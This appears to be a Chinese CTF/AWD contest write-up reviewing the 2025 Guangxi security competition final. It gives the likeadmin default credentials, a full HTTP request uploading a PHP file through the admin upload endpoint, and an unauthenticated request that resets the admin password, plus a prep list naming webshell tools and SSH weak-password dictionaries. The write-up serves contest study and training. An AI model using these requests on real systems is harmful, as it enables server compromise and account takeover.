---
title: 2025 广西网络与信息安全职业技能竞赛决赛 AWD Web 复盘（断网惨痛教训+ThinkPHP+upload+jwt）
contest: 2025 广西网络与信息安全职业技能竞赛
year: 2025
difficulty: medium
vuln_type: [web_unknown, sqli, auth_bypass, upload]
tags: [广西 2025 决赛 AWD Web, 断网环境 复盘教训, 纸质密码信封 第二张纸, 过度紧张 基础薄弱, PHP likeadmin/admin 默认密码, 后台任意文件上传 UploadController file(), 123.php multipart/form-data, 未授权重置管理员密码 auth.admin/edit, 用户操作未鉴权, ThinkPHP 鉴权漏洞, awd 一题多漏洞, 离线资料包 应急]
attack_chain:
  - 默认密码 admin/likeadmin（很多人试不成功，可能密码重置）
  - 后台 UploadController.file() 任意文件上传
  - POST /adminapi/upload/file multipart form-data filename=123.php
  - 未授权：/adminapi/auth.admin/edit 改 id=1 账号密码
  - ThinkPHP 框架：删除管理员 token 仍可操作（鉴权绕过）
  - 断网教训：纸质密码信封 + SSH 密码独立纸片
key_payload: "POST /adminapi/upload/file Content-Type: multipart/form-data"
one_liner: 2025 广西决赛 AWD Web 复盘：纸质密码信封错过 + PHP likeadmin 默认 + UploadController 上传 + 未授权改密 + ThinkPHP 鉴权绕过。断网教训。
lesson: AWD 线下赛 = 断网 + 纸质密码信封多页 + 限时 20 分钟防御时间；赛前必备：本地代码审计脚本、漏洞扫描字典、上传 webshell 工具、ssh 弱密码字典；AWD 一题多漏洞，不要只审一个入口。
quality: medium
---

# 2025 广西网络与信息安全职业技能竞赛决赛 AWD Web 复盘

> 公众号"隼目安全"  
> 作者：第一次打 AWD 线下赛，断网环境彻底暴露基础薄弱

## 复盘教训

1. **纸质密码信封**：信封里有两张纸，第二张是 SSH 密码；裁判也宣读过，但因紧张错过
2. **过度依赖网络和 AI**：断网时没有"独立、耐心地阅读代码、分析漏洞"的能力
3. **基础薄弱**：能搜到的漏洞，断网时都认不出来
4. **CPP 裸 UAF pwn**：调试得手忙脚乱，思路乱

## 赛后复现漏洞（这些本该拿下）

### 漏洞点 1：默认密码
- `admin / likeadmin`（很多选手没登录成功，可能有密码重置漏洞）
- 登录框限制 5 次错误锁 30 分钟，但 mysql 也被锁，最多 30 次爆破

### 漏洞点 2：后台任意文件上传
- `server/app/adminapi/controller/UploadController.php` 中 `file()` 方法
```http
POST /adminapi/upload/file HTTP/1.1
Host: 192.168.2.27:8091
token: c44e3426e73f3f7c1a7562ce1cacb962
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="123.php"
Content-Type: image/png

<?php phpinfo();?>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

### 漏洞点 3：未授权重置管理员密码
- ThinkPHP 框架鉴权绕过：删除管理员 token 仍可操作
- 用户操作未鉴权
```http
POST /adminapi/auth.admin/edit HTTP/1.1
Host: 127.0.0.1:2998
Content-Type: application/json;charset=UTF-8

{"id":1,"account":"admin","name":"admin","dept_id":[1],"jobs_id":[],"role_id":[],"avatar":"...","password":"admin1","password_confirm":"admin1","disable":0,"multipoint_login":1,"root":1}
```

## AWD 经验教训

1. **AWD 一题多漏洞**：不要只审一个入口，错过大量基础漏洞
2. **赛前准备**：
   - 本地代码审计脚本（grep 后门、危险函数）
   - 上传 webshell 工具
   - ssh 弱密码字典（test/ubuntu/root/guest/admin 等）
   - 离线漏洞库（Struts2、Spring、ThinkPHP、Yii 等 CVE）
3. **纸质材料必读**：AWD 一般会发纸质密码信封 + 多张说明纸，要逐张看完
4. **断网心态**：把常见漏洞特征熟记于心，看到 `file()` 方法就要想到上传，看到 `/auth` 就要想到 JWT/未授权
